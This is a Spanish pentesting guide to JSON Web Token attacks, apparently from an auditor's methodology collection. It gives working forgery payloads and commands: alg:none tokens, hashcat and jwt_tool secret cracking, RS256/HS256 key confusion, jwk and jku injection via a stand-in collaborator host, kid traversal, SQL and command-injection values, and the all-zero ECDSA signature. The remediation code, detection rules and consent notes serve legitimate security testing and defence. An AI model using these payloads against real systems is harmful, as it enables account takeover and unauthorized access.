# Ataques a JSON Web Tokens (JWT)

| Clasificación | |
|---|---|
| CWE | CWE-347 — Improper Verification of Cryptographic Signature; CWE-345 — Insufficient Verification of Data Authenticity; CWE-1391 — Use of Weak Credentials (secreto HMAC débil); CWE-613 — Insufficient Session Expiration; CWE-319/CWE-200 (datos sensibles en claro en el payload) |
| OWASP Top 10:2025 | A07 — Authentication Failures (y A04 — Cryptographic Failures cuando la causa es criptográfica) |
| OWASP API Top 10:2023 | API2 — Broken Authentication |
| WSTG | WSTG-SESS-10 (Testing JSON Web Tokens); WSTG-ATHN-04 (Bypassing Authentication Schema) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (alg none, firma no verificada, secreto débil, confusión RS→HS, inyección de jwk, jku/x5u, kid, claims y caducidad, JWE, confusión de tokens, ECDSA "psychic signatures") · 5. Evasión · 6. Escalada y encadenamiento · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

Un **JWT** (RFC 7519) es un token con tres partes en Base64URL separadas por puntos: `cabecera.payload.firma`. La cabecera indica el algoritmo (`alg`) y, opcionalmente, de dónde sacar la clave (`kid`, `jku`, `jwk`, `x5u`, `x5c`). El payload contiene **claims** (afirmaciones) como `sub` (sujeto/usuario), `role`, `exp` (caducidad), `iss` (emisor) y `aud` (audiencia). La firma (**JWS**) garantiza integridad, no confidencialidad: cualquiera puede leer el payload. La variante cifrada es **JWE** (cinco partes).

Algoritmos: **HS256/384/512** (HMAC, clave simétrica compartida), **RS/PS** (RSA), **ES** (ECDSA), **EdDSA** y `none` (sin firma).

Los fallos aparecen porque el servidor **confía en la cabecera del propio token** para decidir cómo verificarlo (algoritmo y clave), usa funciones de "decodificar" en lugar de "verificar", emplea secretos HMAC débiles, no valida claims (`exp`, `aud`, `iss`) o acepta tokens de otro contexto (un `id_token` de OIDC como token de acceso, un token de otro entorno con la misma clave).

## 2. Dónde buscar (señales del reconocimiento)

- `Authorization: Bearer eyJ…`, cookies (`token`, `jwt`, `access_token`, `id_token`, `auth`), `localStorage`/`sessionStorage`, parámetros de URL (`?token=eyJ…`), mensajes WebSocket, cabeceras personalizadas (`X-Auth-Token`).
- La regex `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*` en el historial del proxy, ficheros JS, respuestas y logs.
- Claves públicas: `/.well-known/jwks.json`, `/.well-known/openid-configuration` (campo `jwks_uri`), `/oauth/jwks`, `/api/keys`, `/certs`, `/oauth2/v1/keys`, el certificado TLS (a veces reutilizado).
- Cabeceras del token con `kid`, `jku`, `x5u`, `jwk`, `x5c`, `cty`, `crit`, `zip`.
- Varios servicios que aceptan el mismo token (microservicios, entornos de pruebas y producción) y librerías visibles en errores (`JsonWebTokenError`, `io.jsonwebtoken`, `PyJWT`, `firebase/php-jwt`).

## 3. Detección segura (primeras sondas, no destructivas)

Todas las sondas usan **tu propio token** y se prueban contra un endpoint de solo lectura que devuelva tu identidad (`GET /api/me`). Primero verifica cada técnica sin cambiar la identidad (misma `sub`) y solo después cambia claims.

1. Decodifica cabecera y payload; anota `alg`, `kid`, `typ`, claims de identidad y de rol, `exp`/`iat`.
2. **¿Se verifica la firma?** Altera un carácter de la firma (o elimínala) y repite `GET /api/me`. Si responde 200, la firma no se verifica.
3. **¿Se valida `exp`?** Reutiliza un token tuyo caducado.
4. **¿Se acepta `alg:none`?** (sección 4.1).
5. **¿El secreto HMAC es débil?** Crackeo offline (sección 4.3): no genera tráfico contra el objetivo.
6. **¿Lee el servidor `jku`/`x5u`?** Apunta a tu servidor de colaboración y observa si llega una petición (sección 4.6).

```bash
# Decodificar sin herramientas externas
python3 - <<'EOF'
import base64, json, sys
t = "eyJhbGciOi...<token>"
h, p, s = t.split(".")
pad = lambda x: x + "=" * (-len(x) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(pad(h))), indent=2))
print(json.dumps(json.loads(base64.urlsafe_b64decode(pad(p))), indent=2))
EOF
```

## 4. Explotación por contexto o tecnología

### 4.1 `alg: none` (token sin firma)

```text
{"alg":"none","typ":"JWT"}  .  {"sub":"<tu_id>","role":"user"}  .   (firma vacía, conservar el punto final)
Variantes de alg: none · None · NONE · nOnE
Variantes de firma: vacía · eliminar el último punto · firma original conservada
```

```bash
python3 jwt_tool.py <token> -X a            # genera las variantes de alg:none
```

### 4.2 Firma no verificada

Las funciones `decode()` sin verificación (`jwt.decode(token, options={"verify_signature": False})` en PyJWT, `jsonwebtoken.decode()` en Node, `JWT::decode` mal configurado, `parseUnsecuredClaims` en jjwt) son frecuentes. Si la sonda 3.2 funcionó, cambia directamente los claims y reenvía.

### 4.3 Secreto HMAC débil

Si `alg` es `HS*`, crackea offline el secreto con el token capturado.

```bash
hashcat -a 0 -m 16500 token.txt jwt.secrets.list           # lista de wallarm/jwt-secrets
hashcat -a 0 -m 16500 token.txt rockyou.txt -r rules/best64.rule
hashcat -a 3 -m 16500 token.txt ?a?a?a?a?a?a                # fuerza bruta corta
john token.txt --wordlist=jwt.secrets.list --format=HMAC-SHA256
python3 jwt_tool.py <token> -C -d jwt.secrets.list
```

Secretos habituales: `secret`, `secretkey`, `changeme`, `your-256-bit-secret`, `jwt_secret`, el nombre de la app, valores de ejemplo de documentación y frameworks. Con el secreto se firma cualquier token:

```bash
python3 jwt_tool.py <token> -T -S hs256 -p 'secret'                      # editar claims y firmar
python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p 'secret'   # inyectar claim y firmar
```

### 4.4 Confusión de algoritmo RS256 → HS256

Si el servidor usa una función de verificación genérica que acepta el algoritmo de la cabecera y le pasa la **clave pública RSA**, un token `HS256` firmado con HMAC usando como secreto esa clave pública (en el formato exacto que usa el servidor, normalmente PEM con salto de línea final) será aceptado.

```bash
# 1) Obtener la clave pública (JWKS → PEM). Si no se publica, derivarla de dos tokens firmados:
docker run --rm -it portswigger/sig2n <token1> <token2>     # genera candidatos de clave pública y tokens de prueba
# 2) Firmar con HS256 usando el PEM como secreto
python3 jwt_tool.py <token> -X k -pk public.pem
```

Prueba variantes del secreto: PEM con y sin salto de línea final, cabecera `BEGIN PUBLIC KEY` (SPKI) frente a `BEGIN RSA PUBLIC KEY` (PKCS#1), y la forma DER. En Burp JWT Editor: *New Symmetric Key* con `k` = Base64 del PEM y firmar con HS256. Precedente público: CVE-2015-9235 (`jsonwebtoken` de Node antes de 4.2.2). La misma confusión aparece con ECDSA y con EdDSA en librerías que aceptan cualquier tipo de clave.

### 4.5 Clave embebida en la cabecera (`jwk`)

Si el servidor usa la clave pública que viene **dentro** del token (RFC 7515 permite el parámetro, pero el verificador no debe confiar en él), genera tu par de claves, firma y embebe la pública. Precedente: CVE-2018-0114 (node-jose).

```json
{"alg":"RS256","typ":"JWT","kid":"corvus","jwk":{"kty":"RSA","e":"AQAB","kid":"corvus","n":"<módulo de tu clave pública>"}}
```
```bash
python3 jwt_tool.py <token> -X i                    # inyección de JWKS en línea
# Burp JWT Editor: Attack → Embedded JWK
```

### 4.6 `jku` y `x5u` (clave obtenida de una URL)

```json
{"alg":"RS256","typ":"JWT","kid":"corvus","jku":"https://corvus-collab.oastify.example/jwks.json"}
{"alg":"RS256","typ":"JWT","x5u":"https://corvus-collab.oastify.example/cert.pem"}
```

1. Sonda: pon tu URL de colaboración y comprueba si el servidor la pide (además confirma un **SSRF**, ver `vulns/ssrf.md`).
2. Explotación: publica un JWKS con tu clave y firma con ella (`python3 jwt_tool.py <token> -X s -ju https://tu-servidor/jwks.json`).
3. Si hay lista blanca de dominios, prueba bypasses de validación de URL: `https://target.tld@atacante.tld/`, `https://target.tld.atacante.tld/`, `https://atacante.tld#target.tld`, una **redirección abierta** en el dominio permitido (`https://target.tld/redirect?url=https://atacante.tld/jwks.json`, ver `vulns/open-redirect.md`), o subir el `jwks.json` a una función de subida de ficheros del propio dominio (ver `vulns/file-upload.md`).
4. `x5c` (cadena de certificados en la cabecera): verifica si acepta un certificado autofirmado sin validar la cadena contra una CA de confianza.

### 4.7 Inyección en `kid`

El `kid` (*Key ID*) identifica qué clave usar; si se usa en una ruta de fichero, una consulta SQL o un comando, es una entrada controlable.

```text
Path traversal hacia un fichero de contenido conocido y firmar con ese contenido como secreto HMAC:
  "kid":"../../../../../../dev/null"          → secreto = cadena vacía (o un byte nulo, según la lectura)
  "kid":"../../../../../../proc/sys/kernel/randomize_va_space"  → secreto = "2\n" (valor típico)
  "kid":"/../../../../../../usr/share/fonts/../../../dev/null"

SQL injection en el almacén de claves (devolver un secreto elegido):
  "kid":"x' UNION SELECT 'corvus'-- -"        → firmar con HS256 y secreto "corvus"

Inyección de comandos (librerías antiguas que hacían exec con el kid) — solo si hay evidencia en caja blanca:
  "kid":"key.pem|sleep 5"
```
```bash
python3 jwt_tool.py <token> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""
```

En Burp JWT Editor: crear clave simétrica con `k` = `AA==` (byte nulo en Base64) para `/dev/null`.

### 4.8 Claims, caducidad y contexto

- Cambiar identidad o privilegios (`sub`, `user_id`, `email`, `role`, `groups`, `scope`, `is_admin`, `tenant`/`org_id`) una vez que puedes firmar, o si el servidor no verifica firma.
- Caducidad: eliminar `exp`, poner `exp` lejano, reutilizar tokens caducados, `nbf` futuro, tolerancias de reloj enormes.
- `aud`/`iss`: reutilizar un token emitido para otro servicio, otro cliente OAuth u otro entorno (staging → producción) que comparte la clave de firma.
- Revocación: el token sigue funcionando tras logout, cambio de contraseña o eliminación del usuario (no hay lista de revocación por `jti` y la vida útil es larga). Ver `vulns/session.md`.
- Información sensible en claro en el payload (PII, permisos internos, claves).

### 4.9 Confusión entre tipos de token

- Enviar un `id_token` de OIDC donde se espera un `access_token` (ver `vulns/oauth-oidc-saml.md`), un *refresh token* como token de acceso, un token de verificación de email o de reset (también JWT y con la misma clave) como token de sesión.
- Cuando hay `typ` (`at+jwt`, `dpop+jwt`, `JWT`), comprobar que el servidor lo exige.
- Enviar un JWT a un endpoint que espera una clave API y viceversa; tokens de una app móvil contra la API web.

### 4.10 JWE (tokens cifrados)

- Un JWE de cinco partes protege la confidencialidad, pero si el servidor acepta también JWS (o JWE sin un JWS interno firmado), un atacante que conozca la clave pública de cifrado puede **cifrar un payload arbitrario**: el cifrado con clave pública no autentica al emisor.
- `alg: RSA1_5` (PKCS#1 v1.5) expone a ataques de oráculo de *padding* (Bleichenbacher) si los errores son distinguibles; `dir` con claves compartidas débiles; `zip: DEF` sin límite (descompresión masiva, DoS).
- ECDH-ES en librerías antiguas sin validar que el punto está en la curva (*invalid curve attack*).

### 4.11 ECDSA "psychic signatures" (CVE-2022-21449)

En Java 15–18 sin parches de abril de 2022, una firma ECDSA con `r = s = 0` se aceptaba como válida para cualquier mensaje. Para `ES256` en formato JWS (r‖s de 64 bytes), la firma es 64 bytes a cero:

```text
<cabecera ES256>.<payload>.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Solo tiene sentido si la huella apunta a Java en esas versiones; pruébalo primero sin cambiar claims.

## 5. Evasión de filtros y WAF

- Cambiar la capitalización de `alg` y de `typ`; añadir parámetros desconocidos en la cabecera; reordenar claves.
- Relleno Base64 (`=`) o Base64 estándar (`+`, `/`) en lugar de Base64URL: algunos *parsers* lo aceptan y el filtro no lo reconoce.
- Mover el token entre cabecera, cookie y parámetro (`?access_token=`) si el filtro solo inspecciona una ubicación.
- Claims duplicados en el JSON (`{"role":"user","role":"admin"}`): el validador y la aplicación pueden usar parsers distintos.
- Cabecera `crit` con una extensión inventada: un verificador conforme debe rechazarla; si la acepta, indica validación laxa de la cabecera (necesitas una forma legítima de firmar para que la prueba sea concluyente).

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **Falsificación de token → suplantación**: con firma falsificable, demuestra el impacto forjando un token para la **cuenta `B` del auditor** o con un `role` superior y llamando a un endpoint de lectura (`GET /api/me`, `GET /api/admin/stats`). ⚠️ Suplantar cuentas reales o ejecutar acciones de escritura con privilegios falsificados **requiere confirmación explícita del cliente**.
- **Multi-tenant**: cambiar `org_id`/`tenant` del token hacia la organización de prueba del auditor (ver `vulns/access-control-idor.md`).
- **`jku`/`x5u` → SSRF** hacia servicios internos o metadatos de la nube (`vulns/ssrf.md`).
- **`kid` → SQLi/LFI/RCE** en el almacén de claves (`vulns/sqli.md`, `vulns/path-traversal-lfi.md`, `vulns/cmdi-rce.md`).
- **Secreto HMAC crackeado**: suele ser compartido con otros servicios (cookies de sesión de Flask/Express, firmas de webhooks); compruébalo y repórtalo como exposición de credencial.
- **Token robado vía XSS** desde `localStorage` → toma de sesión (`vulns/xss.md`).

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Fuentes**: el token completo, en particular `alg`, `kid`, `jku`, `x5u`, `jwk`. **Sumideros**: llamadas de verificación con algoritmo no fijado, `decode` sin verificación, resolvedores de clave que leen ficheros/BD/URL con el `kid`/`jku`.

```js
// Node — jsonwebtoken
jwt.decode(token);                                   // vulnerable: no verifica
jwt.verify(token, publicKeyOrSecret);                // riesgo: sin algorithms en versiones antiguas
jwt.verify(token, publicKey, { algorithms: ['RS256'], issuer: ISS, audience: AUD });   // seguro
// jose (panva): createRemoteJWKSet(new URL(JWKS_FIJO)) + jwtVerify(token, JWKS, { issuer, audience, algorithms:['RS256'] })
```
```python
# PyJWT
jwt.decode(token, options={"verify_signature": False})                 # vulnerable
jwt.decode(token, key, algorithms=jwt.get_unverified_header(token)["alg"])   # vulnerable: el atacante elige alg
jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"], audience=AUD, issuer=ISS,
           options={"require": ["exp", "iss", "aud", "sub"]})          # seguro
```
```java
// jjwt
Jwts.parser().unsecured().build().parse(token);                        // vulnerable (acepta alg none)
Jwts.parser().verifyWith(publicKey).requireIssuer(ISS).requireAudience(AUD).build().parseSignedClaims(token); // seguro
// Auth0 java-jwt: JWT.decode(token) no verifica; usar JWT.require(Algorithm.RSA256(pub, null)).withIssuer(ISS).build().verify(token)
```
```php
// firebase/php-jwt >= 6: JWT::decode($jwt, new Key($key, 'HS256'));  // el algoritmo va ligado a la clave (seguro)
// Patrón vulnerable: resolver de clave que usa $header->kid en file_get_contents() o en SQL concatenado
```
```go
// golang-jwt: el keyFunc debe comprobar el método
token, err := jwt.Parse(s, func(t *jwt.Token) (any, error) {
    if _, ok := t.Method.(*jwt.SigningMethodRSA); !ok { return nil, fmt.Errorf("alg inesperado") }
    return pubKey, nil
}, jwt.WithValidMethods([]string{"RS256"}), jwt.WithIssuer(ISS), jwt.WithAudience(AUD))
// jwt.ParseUnverified(...) es vulnerable si su resultado se usa para autorizar
```

```bash
rg -n 'jwt\.decode\(|ParseUnverified|parseUnsecured|unsecured\(\)|verify_signature.{0,5}False|JWT\.decode\(' 
rg -n -i 'algorithms\s*[:=]\s*.*(header|get_unverified_header|\.alg)'
rg -n -i '(kid|jku|x5u).{0,80}(readFile|file_get_contents|open\(|fetch\(|requests\.get|query\(|execute\()'
rg -n -i '(jwt|token)_?secret\s*[:=]\s*["'"'"'][^"'"'"']{0,24}["'"'"']'      # secretos cortos en código
```
```yaml
rules:
- id: corvus-pyjwt-no-verify
  languages: [python]
  severity: ERROR
  message: JWT decodificado sin verificar la firma
  pattern: jwt.decode(..., options={..., "verify_signature": False, ...}, ...)
- id: corvus-jsonwebtoken-decode-auth
  languages: [javascript, typescript]
  severity: WARNING
  message: jwt.decode() no verifica la firma; no usar su resultado para autorizar
  pattern: $JWT.decode($TOKEN, ...)
- id: corvus-jsonwebtoken-verify-no-algorithms
  languages: [javascript, typescript]
  severity: WARNING
  message: jwt.verify sin lista de algoritmos permitidos
  patterns:
    - pattern: $JWT.verify($T, $K)
```

Registro de reglas útiles: `semgrep --config p/jwt`.

## 8. Falsos positivos frecuentes

- El endpoint ignora el JWT y autentica por cookie de sesión: tu token "falsificado" funciona porque no se usa. Repite la prueba **sin** la cookie.
- La API devuelve 200 en endpoints públicos con cualquier token; prueba contra uno que devuelva la identidad.
- Un token caducado aceptado por la tolerancia de reloj (`leeway` de 30–60 s) no es un fallo.
- `kid` con traversal que devuelve error distinto no implica explotación: hace falta un token aceptado.
- Encontrar el secreto en un repositorio de ejemplo no implica que producción lo use: valida firmando un token y obteniendo una respuesta autenticada.
- Lectura de PII en el payload de tu propio token es un hallazgo menor de exposición, no de autenticación.

## 9. Evidencia mínima para validarlo

- Token original y token manipulado (decodificados, cabecera y payload), con la técnica usada (y secreto o clave empleados).
- Petición con el token manipulado y respuesta del servidor que demuestra aceptación: identidad o rol distinto en `GET /api/me`, o datos de la cuenta `B` del auditor.
- Para `jku`/`x5u`: registro de la petición entrante en el servidor de colaboración con IP y User-Agent del objetivo.
- Para secreto débil: el secreto, el comando de crackeo y un token firmado aceptado. Redacta el secreto en el informe si el cliente lo pide.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| Falsificación de token sin autenticar → cualquier usuario/admin | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (9.3) |
| Falsificación que requiere un token de usuario válido para empezar | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (8.7) |
| Token caducado o revocado sigue siendo válido | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` (7.4) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| `jku`/`x5u` solo provoca SSRF ciego | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N` |
| PII sensible en claro en el payload | `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` (4.3) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |

Si el token forjado da acceso a otros sistemas que comparten la clave (SSO), refleja el impacto en sistemas subsiguientes (`S:C` en 3.1, `SC/SI/SA` en 4.0). Calcula la puntuación 4.0 exacta en la calculadora de FIRST.

## 11. Remediación (con ejemplo de código correcto)

- Fijar en el servidor el algoritmo (o lista mínima) **por emisor**, sin leerlo del token; rechazar `none`; ligar cada clave a un único algoritmo y tipo.
- Usar siempre la función de verificación, nunca `decode` para autorizar.
- Claves de firma: asimétricas (RS256/ES256/EdDSA) cuando hay varios consumidores; si es HMAC, secreto aleatorio de ≥256 bits gestionado en un almacén de secretos y rotado.
- Ignorar `jwk`, `jku`, `x5u`, `x5c` del token salvo que se validen contra una lista fija de emisores y URLs exactas; `kid` solo como clave de búsqueda en un mapa en memoria, nunca en rutas, SQL o comandos.
- Validar `exp`, `nbf`, `iat`, `iss`, `aud`, `typ` y, en OAuth, que sea un token de acceso (RFC 9068 `at+jwt`), no un `id_token`.
- Vida útil corta (5–15 min) para tokens de acceso, *refresh tokens* rotativos con detección de reutilización, lista de revocación por `jti` para eventos críticos (logout, cambio de contraseña).
- No guardar datos sensibles en el payload; si hace falta confidencialidad, JWE con algoritmos modernos (RSA-OAEP-256, ECDH-ES) y nunca aceptar JWE sin firma interna como autenticación.
- Mantener las librerías actualizadas; considerar formatos sin negociación de algoritmo (PASETO) o tokens ligados al cliente (DPoP, mTLS).

```js
import { createRemoteJWKSet, jwtVerify } from 'jose';
const JWKS = createRemoteJWKSet(new URL('https://idp.example.tld/.well-known/jwks.json')); // URL fija, no del token
export async function auth(req, res, next) {
  try {
    const token = (req.headers.authorization || '').replace(/^Bearer /, '');
    const { payload } = await jwtVerify(token, JWKS, {
      issuer: 'https://idp.example.tld/', audience: 'api://orders',
      algorithms: ['RS256'], typ: 'at+jwt', maxTokenAge: '15m',
    });
    if (await revoked(payload.jti)) return res.sendStatus(401);
    req.user = { id: payload.sub, tenant: payload.org_id };
    next();
  } catch { res.sendStatus(401); }
}
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

- **Burp — JWT Editor**: editar, firmar y atacar (Embedded JWK, `alg:none`, HMAC key confusion) dentro de Repeater; primera opción para pruebas manuales.
- **jwt_tool** (ticarpi): `-X a` (alg none), `-X n` (firma nula), `-X b` (contraseña vacía), `-X s -ju <url>` (JWKS suplantado), `-X k -pk <pem>` (confusión de clave), `-X i` (JWKS embebido), `-C -d <lista>` (crackeo), `-T` (editar), `-I -pc/-pv/-hc/-hv` (inyectar claims/cabeceras), `-S <alg> -p <secreto>` (firmar). El modo de escaneo contra el objetivo (`-t <url> -rh "Authorization: Bearer <token>" -M pb`) solo después de las pruebas manuales y a ritmo controlado.
- **hashcat** `-m 16500` / **john** `--format=HMAC-SHA256`: crackeo offline del secreto; lista `jwt.secrets.list` (wallarm/jwt-secrets).
- **portswigger/sig2n** (Docker): derivar la clave pública RSA a partir de dos tokens.
- **Burp — JSON Web Tokens**, **JOSEPH** (incluye ataques a JWE), **Burp Collaborator / interactsh** para `jku`/`x5u`.
- **semgrep** `p/jwt` y ripgrep en caja blanca.

## 13. Referencias

- RFC 7515 (JWS), RFC 7516 (JWE), RFC 7517 (JWK), RFC 7519 (JWT), RFC 8725 (JWT Best Current Practices), RFC 9068 (JWT Profile for OAuth 2.0 Access Tokens).
- OWASP WSTG — WSTG-SESS-10 Testing JSON Web Tokens; OWASP JSON Web Token Cheat Sheet.
- PortSwigger Web Security Academy — JWT attacks (algorithm confusion, jwk/jku/kid injection).
- PayloadsAllTheThings — JSON Web Token; HackTricks — JWT Vulnerabilities.
- ticarpi/jwt_tool wiki; wallarm/jwt-secrets.
- CVE-2015-9235 (jsonwebtoken), CVE-2018-0114 (node-jose), CVE-2022-21449 (Java ECDSA "Psychic Signatures").
- MITRE CWE-347, CWE-345, CWE-613.
